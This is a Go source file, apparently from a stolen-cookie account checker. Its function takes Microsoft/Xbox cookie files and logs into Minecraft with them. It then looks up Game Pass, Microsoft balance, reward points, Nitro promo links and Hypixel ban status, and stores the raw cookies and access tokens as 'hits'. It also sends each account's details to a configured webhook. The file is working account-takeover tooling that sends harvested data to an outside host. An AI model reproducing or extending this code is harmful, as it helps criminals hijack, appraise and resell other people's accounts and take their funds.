package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
)

func processCookieStage2(data cookieXboxResult, cfg *Config) {
	client := data.client
	cookieFile := data.cookieFile
	rawLines := data.rawLines

	mcToken, profile, err := cookieMCAuth(client, data.uhs, data.bearer)
	if err != nil {
		ce := categorizeCookieError(err)
		atomic.AddInt64(&cookieInvalid, 1)
		ll := fmt.Sprintf("[%s] %s | %s", ce.Category, cookieFile, ce.Detail)
		safeWrite("cookie_errors.log", ll)
		switch ce.Category {
		case "EXPIRED", "AUTH_FAILED", "MC_REJECTED":
			safeWrite("cookie_invalid.txt", fmt.Sprintf("%s | %s: %s", cookieFile, ce.Category, ce.Message))
			logErrorLine("[%s] %s | %s", ce.Category, cookieFile, ce.Message)
		case "TIMEOUT", "NETWORK":
			safeWrite("cookie_network_errors.log", ll)
			logLine("[%s] %s", ce.Category, cookieFile)
		case "RATE_LIMITED":
			safeWrite("cookie_rate_limited.log", ll)
			logLine("[RATE_LIMITED] %s", cookieFile)
		default:
			safeWrite("cookie_unknown_errors.log", ll)
			logErrorLine("[COOKIE_ERR] %s | %s", cookieFile, ce.Message)
		}
		return
	}

	atomic.AddInt64(&cookieValid, 1)
	atomic.AddInt64(&mcHits, 1)
	accessToken := mcToken.AccessToken

	username := "Unknown"
	uuid := ""
	if profile != nil {
		username = profile.Name
		uuid = profile.ID
	}

	rd := resultsDir(cookieFile)
	ensureDir(rd)

	cookieOut := filepath.Join(rd, "cookie.txt")
	f, err := os.Create(cookieOut)
	if err == nil {
		for _, l := range rawLines {
			fmt.Fprintln(f, l)
		}
		f.Close()
	}

	gamepassResult := ""
	if cfg.GamepassPC || cfg.GamepassUltimate {
		gp, err := checkGamepass(client, accessToken)
		if err != nil {
			logError("value_check_errors.log", cookieFile+" gamepass", err)
		}
		gamepassResult = gp
	}

	msBalance := ""
	if cfg.MSRewards {
		bal, err := checkMSBalance(client, accessToken)
		if err != nil {
			logError("value_check_errors.log", cookieFile+" msbalance", err)
		}
		msBalance = bal
	}

	rewardPoints := ""
	if cfg.MSRewards {
		rp, err := checkRewardPoints(client, accessToken)
		if err != nil {
			logError("value_check_errors.log", cookieFile+" rewardpoints", err)
		}
		rewardPoints = rp
	}

	if cfg.XboxPerks {
		perks, err := checkXboxPerks(client, accessToken)
		if err != nil {
			logError("value_check_errors.log", cookieFile+" perks", err)
		}
		_ = perks
	}

	if cfg.NitroPromo {
		nitros, err := checkNitroPromos(client, accessToken)
		if err != nil {
			logError("value_check_errors.log", cookieFile+" nitro", err)
		}
		for _, n := range nitros {
			writeToFile(filepath.Join(rd, "nitro_links.txt"), n)
		}
	}

	hypixelInfo := ""
	if cfg.HypixelCheck && uuid != "" {
		hInfo, err := checkHypixel(uuid, cfg.HypixelAPIKey)
		if err != nil {
			logError("value_check_errors.log", cookieFile+" hypixel", err)
		}
		hypixelInfo = hInfo
		if cfg.IncludeHypixel && hInfo != "" {
			safeWrite(filepath.Join(rd, "hypixel.txt"), hInfo)
		}
	}

	banInfo := ""
	if cfg.HypixelBan && username != "Unknown" {
		bi, err := checkHypixelBan(username, uuid, accessToken)
		if err != nil {
			logError("value_check_errors.log", cookieFile+" hypixelban", err)
		}
		banInfo = bi
		if strings.Contains(banInfo, "banned") {
			atomic.AddInt64(&hypixelBanned, 1)
			safeWrite(filepath.Join(rd, "hypixel_ban.txt"), banInfo)
			writeToFile("hypixel_ban.txt", fmt.Sprintf("%s | %s | %s", cookieFile, username, banInfo))
			logHypixel("[HYPIXEL] %s | %s", username, banInfo)
		} else if strings.Contains(banInfo, "unbanned") {
			atomic.AddInt64(&hypixelUnban, 1)
			safeWrite(filepath.Join(rd, "hypixel_unban.txt"), banInfo)
			writeToFile("hypixel_unban.txt", fmt.Sprintf("%s | %s | %s", cookieFile, username, banInfo))
			logHypixel("[HYPIXEL] %s | %s", username, banInfo)
		}
	}

	safeWrite(filepath.Join(rd, "mc_token.txt"), mcToken.AccessToken)
	if username != "Unknown" {
		safeWrite(filepath.Join(rd, "mc_username.txt"), username)
	}
	if gamepassResult != "" {
		safeWrite(filepath.Join(rd, "gamepass.txt"), gamepassResult)
	}
	if msBalance != "" {
		safeWrite(filepath.Join(rd, "ms_balance.txt"), msBalance)
	}
	if rewardPoints != "" {
		safeWrite(filepath.Join(rd, "reward_points.txt"), rewardPoints)
	}
	if hypixelInfo != "" {
		safeWrite(filepath.Join(rd, "hypixel.txt"), hypixelInfo)
	}

	if currentRunDir != "" {
		cookieName := username + ".txt"
		copyFile(cookieFile, filepath.Join(currentRunDir, "minecraft", "all_mc_hits", cookieName))
		if strings.Contains(banInfo, "unbanned") {
			copyFile(cookieFile, filepath.Join(currentRunDir, "minecraft", "hypixel_hits", "unbanned", cookieName))
		} else if strings.Contains(banInfo, "banned") {
			copyFile(cookieFile, filepath.Join(currentRunDir, "minecraft", "hypixel_hits", "banned", cookieName))
		}
	}

	if cfg.Webhook != "" || cfg.DefaultWebhook != "" {
		wh := cfg.Webhook
		if wh == "" {
			wh = cfg.DefaultWebhook
		}
		embed := buildAccountWebhookEmbed(
			fmt.Sprintf("COOKIE:%s", cookieFile), "",
			username, uuid,
			gamepassResult, msBalance, rewardPoints, hypixelInfo)
		sendWebhook(wh, embed)
	}

	logSuccess("[COOKIE HIT] %s | %s | GP: %s", username, uuid, gamepassResult)
}
